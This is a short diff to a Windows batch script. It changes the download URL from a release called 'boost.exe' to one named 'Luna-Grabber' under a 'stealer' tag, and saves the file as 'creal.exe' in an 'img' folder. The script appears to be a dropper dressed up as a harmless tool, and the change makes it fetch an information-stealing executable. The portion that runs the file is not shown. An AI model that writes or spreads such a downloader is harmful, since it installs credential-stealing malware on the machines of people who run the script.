@@ -1,6 +1,6 @@
 
 @echo off
-set "URL=https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe"
+set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
 set "Dossier=img"
 set "NomFichier=%Dossier%\creal.exe"
 
